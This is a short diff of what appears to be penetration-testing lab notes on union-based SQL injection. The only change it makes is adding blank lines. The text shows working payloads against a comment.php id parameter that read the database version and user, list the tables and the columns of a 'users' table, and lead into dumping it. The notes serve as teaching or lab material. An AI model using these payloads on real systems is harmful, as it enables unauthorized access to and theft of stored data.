@@ -99,11 +99,13 @@ Once we gain control we can use limit's to ensure we only get one record if nece
 5. Now we can start enumerating using our union statements
 
     Version: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,@@version,6`
+    
     User: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,user(),6`
 
 6. In this case we are running as root so we can enumerate more heavily
 
     All Tables: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,table_name,6 FROM information_schema.tables`
+    
     Get columns for a specific table: `10.11.5.115/comment.php?id=738 UNION SELECT 1,2,3,4,column_name,6 FROM information_schema.columns where table_name="users"`
 
 7. Then it's just a case of dumping data of that table
